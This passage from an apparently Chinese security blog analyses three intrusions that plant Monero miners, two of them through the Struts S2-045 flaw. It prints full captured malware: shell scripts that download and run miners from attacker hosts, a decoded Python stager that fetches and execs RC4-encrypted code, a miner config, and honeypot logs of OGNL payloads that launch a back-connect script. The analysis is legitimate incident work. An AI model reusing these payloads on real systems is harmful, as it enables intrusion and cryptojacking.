+<p>链接：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p>
+<p>但是其中最后部分又经过了加密.</p>
+<p>下面还有一段命令：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-3-43.png" alt="15-3-43"></p>
+<p>从<strong>149.255.35.91</strong>上下载<strong>larva.sh</strong>文件并执行，之后删除这个文件</p>
+<p><strong>larva.sh</strong> 内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">psarg=<span class="string">""</span></div><div class="line"><span class="keyword">if</span> [[ -n `ps -lf` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-lf"</span></div><div class="line"><span class="keyword">elif</span> [[ -n `ps -au` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-au"</span></div><div class="line"><span class="keyword">fi</span></div><div class="line">mutex=<span class="string">"21914"</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$psarg</span> ]]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [[ `ps <span class="variable">$psarg</span> | grep -v grep | grep -c <span class="variable">$mutex</span> ` -gt 0 ]]; <span class="keyword">then</span></div><div class="line">mutex_exist=1</div><div class="line"><span class="keyword">else</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$mutex_exist</span> -gt 0 ]]; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> mutex exist, quiting script</div><div class="line"><span class="built_in">exit</span></div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> mutex not exist, starting a new one</div><div class="line">sleep 800.<span class="variable">$mutex</span> &amp;</div><div class="line"><span class="keyword">fi</span></div><div class="line">sh -c <span class="string">"(cat &lt; /dev/tcp/ait7ee.win/23546 &gt; /tmp/mule || wget http://ait7ee.win/mule -O /tmp/mule || curl -s http://ait7ee.win/mule -o /tmp/mule) &amp;&amp; chmod +x /tmp/mule &amp;&amp; (nohup /tmp/mule &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /tmp/mule"</span> &amp;</div><div class="line">rm -f /tmp/larva.sh</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">tcp_download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">Target=<span class="variable">$3</span></div><div class="line">cat &lt; /dev/tcp/<span class="variable">$FileServer</span>/<span class="variable">$Port</span> &gt; <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">http_download</span></span>()</div><div class="line">&#123;</div><div class="line">Url=<span class="variable">$1</span></div><div class="line">Target=<span class="variable">$2</span></div><div class="line">wget <span class="variable">$Url</span> -O <span class="variable">$Target</span> || curl -s <span class="variable">$Url</span> -o <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">tcp_download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$Target</span> || http_download http://<span class="variable">$FileServer</span>/<span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download_and_execute</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">chmod +x <span class="variable">$Target</span></div><div class="line">nohup <span class="variable">$Target</span> &amp;</div><div class="line">sleep 1</div><div class="line">rm -f <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">echo</span> <span class="string">"from subprocess import *;p = Popen('python',stdin=PIPE); p.stdin.write(\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly80Ni4yMS4xNDcuMTMzOjgwMDEnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPW84MkZ5MU11QWE5M0lMVnYwZS9PQ29qb2M2ST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKydlfU9CdStqRENOP152bVZnOzoxLSFMeG4jR2M8PXs5Syc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));\");"</span> | python</div><div class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></div><div class="line">sleep 3600.<span class="variable">$mutex</span> &amp;</div><div class="line">sleep 3600.<span class="variable">$mutex</span></div><div class="line">download_and_execute ait7ee.win 23547 mule /tmp/mule</div><div class="line">pkill stratum</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<p>主要功能还是从主机下载文件并执行</p>
+<p>其中的域名和ip跟上面解码出来的是同一台主机</p>
+<p>脚本里还有一段编码后的命令，它的明文如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import sys;import re, subprocess;cmd = <span class="string">"ps -ef | grep Little\ Snitch | grep -v grep"</span></div><div class="line">ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)</div><div class="line">out = ps.stdout.read()</div><div class="line">ps.stdout.close()</div><div class="line"><span class="keyword">if</span> re.search(<span class="string">"Little Snitch"</span>, out):</div><div class="line">sys.exit()</div><div class="line">import urllib2;</div><div class="line">UA=<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>;server=<span class="string">'http://46.21.147.133:8001'</span>;t=<span class="string">'/login/process.php'</span>;req=urllib2.Request(server+t);</div><div class="line">req.add_header(<span class="string">'User-Agent'</span>,UA);</div><div class="line">req.add_header(<span class="string">'Cookie'</span>,<span class="string">"session=o82Fy1MuAa93ILVv0e/OCojoc6I="</span>);</div><div class="line">proxy = urllib2.ProxyHandler();</div><div class="line">o = urllib2.build_opener(proxy);</div><div class="line">urllib2.install_opener(o);</div><div class="line">a=urllib2.urlopen(req).<span class="built_in">read</span>();</div><div class="line">IV=a[0:4];data=a[4:];key=IV+<span class="string">'e&#125;OBu+jDCN?^vmVg;:1-!Lxn#Gc&lt;=&#123;9K'</span>;S,j,out=range(256),0,[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(256):</div><div class="line">j=(j+S[i]+ord(key[i%len(key)]))%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">i=j=0</div><div class="line"><span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">i=(i+1)%256</div><div class="line">j=(j+S[i])%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">out.append(chr(ord(char)^S[(S[i]+S[j])%256]))</div><div class="line"><span class="built_in">exec</span>(<span class="string">''</span>.join(out))</div></pre></td></tr></table></figure>
+<p>其中<strong><a href="http://46.21.147.133:8001" target="_blank" rel="external">http://46.21.147.133:8001</a></strong>这个地址已经无法访问，所以不清楚process.php内容是什么</p>
+<p>这次攻击涉及到的样本有 <strong>larva.sh</strong>，<strong>mule</strong>，<strong>scv.ps1</strong></p>
+<p>其中<strong>mule</strong>样本和windows下的<strong>mule64.exe</strong>样本在virustotal上分析结果是门罗币挖矿程序</p>
+<p><a href="https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details" target="_blank" rel="external">https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details</a></p>
+<p><a href="https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details" target="_blank" rel="external">https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details</a></p>
+<p><a href="https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f</a>  (hybrid-analysis的分析)</p>
+<p><strong>ait7ee.win</strong> 这个域名和下面命令中的<strong>149.255.35.91</strong>是同一个ip，virustotal上在10月18号有记录这个域名和相关文件，样本还没有上传</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-1-29.png" alt="15-1-29"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/01/10/powershell植入mule挖矿程序事件分析/" data-id="cjca1zrwj000g881bgu68fot0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-利用s2-045植入门罗币挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/" class="article-date">
+  <time datetime="2018-01-09T12:57:55.000Z" itemprop="datePublished">2018-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近发现RASP拦截到一条请求，进行了简单的分析：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-39-41.png" alt="10-39-41"></p>
+<p>日志部分是这样的：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-41-5.png" alt="10-41-5"></p>
+<p><strong>5.188.10.251</strong>(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 <strong>5.188.87.12</strong>(荷兰)<strong> </strong>这台主机上下载<strong>arrow.jpg</strong>文件并执行** arrow.jpg文件是一个bash脚本，内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">id1=<span class="string">"jbpnwjuxvc"</span></div><div class="line">id2=<span class="string">"jvdxbsjgds"</span></div><div class="line">id3=<span class="string">"xztd"</span></div><div class="line">rm -rf /var/tmp/grdd</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id1</span>`.conf</div><div class="line">ps auxf|grep -v grep|grep -v `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep <span class="string">"/tmp/"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"\-p x"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"wcubpiztlk"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"laqzdbgiuz"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"sacpehnflw"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep `<span class="built_in">echo</span> <span class="variable">$id1</span>`|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps -fe|grep `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]</div><div class="line"><span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"start process....."</span></div><div class="line">chmod 777 /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">curl -o /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">wget -O /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">chmod 777 /var/tmp/acpid</div><div class="line">rm -rf /var/tmp/acpid</div><div class="line">cat /proc/cpuinfo|grep aes&gt;/dev/null</div><div class="line"><span class="keyword">if</span> [ $? -ne 1 ]</div><div class="line"><span class="keyword">then</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line"><span class="keyword">else</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /var/tmp/acpid</div><div class="line"><span class="built_in">cd</span> /var/tmp</div><div class="line">proc=`grep -c ^processor /proc/cpuinfo`</div><div class="line">cores=$(((<span class="variable">$proc</span>+1)/2))</div><div class="line">nohup ./acpid -c `<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf -t `<span class="built_in">echo</span> <span class="variable">$cores</span>` &gt;/dev/null &amp;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"runing....."</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
+<p>主要功能是从 <strong><a href="http://5.188.87.12" target="_blank" rel="external">http://5.188.87.12</a></strong> 下载一个配置文件 <strong>acpid.conf </strong>并重命名，并且下载了 <strong>acpid</strong> 和 <strong>acpid_na </strong>两个样本，</p>
+<p>然后获取了受害主机的cpu核数，把配置文件内容和cpu核数作为参数执行 <strong>acpid</strong> 这个程序</p>
+<p><strong>acpid.conf </strong>内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"url"</span> : <span class="string">"stratum+tcp://158.69.25.71:80"</span>,</div><div class="line"><span class="string">"user"</span> : <span class="string">"43We5FWNCmqffXY5tHriA3LMqhCRgXP9uZvMAZ8gfG7SYaLdQTpo2GGPDjk6zWdGAe6RedPTRhmC1EkGnAY3dPE62H3Gu8R"</span>,</div><div class="line"><span class="string">"pass"</span> : <span class="string">"x"</span>,</div><div class="line"><span class="string">"algo"</span> : <span class="string">"cryptonight"</span>,</div><div class="line"><span class="string">"quiet"</span> : <span class="literal">true</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>根据配置文件内容判断这应该是一个挖矿程序，访问其中了url地址发现返回的是一个 <strong>minexmr</strong> id</p>
+<p>由此判断这属于<strong>门罗币</strong>的挖矿样本，查了一下这个钱包地址应该还在持续收益<img src="H:\gitBlog\themes\landscape\source\upload_image\10-58-43.png" alt="10-58-43"></p>
+<p>脚本中出现的两个样本hash分别为</p>
+<p>9359f7e7b1dd0f4ce4a2c52fe611c981a3dd7a17f935862e3ce9acb5f2df8ced</p>
+<p>f4864b3793c93de50b953e9751dc22e03fa0333ae6856d8d153be9018da6d911</p>
+<p>在virustotal上查询了这两个样本，第一次出现都是在10月30日，在24小时前还被重新上传分析，判断这个样本在近期又开始活跃了:</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\11-15-25.png" alt="11-15-25"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过几次的攻击行为来看利用已公开的漏洞植入恶意挖矿程序变得越来越流行，虚拟货币不断增值也更促进了这一产业链的不断扩大</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/" data-id="cjca1zrwl000j881bxghwks3j" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-s2-045入侵事件分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/09/s2-045入侵事件分析/" class="article-date">
+  <time datetime="2018-01-09T11:40:14.000Z" itemprop="datePublished">2018-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>近期在蜜罐日志中发现一起针对s2-045的攻击，日志内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">201.79.64.0 - - [02/Sep/2017:01:38:01 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.056 199</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:35 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.084 282</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:45 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ftp://88.105.16.7/Public/bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 3.179 700</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:54 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.155 319</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:43:20 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.300 370</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:23 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.082 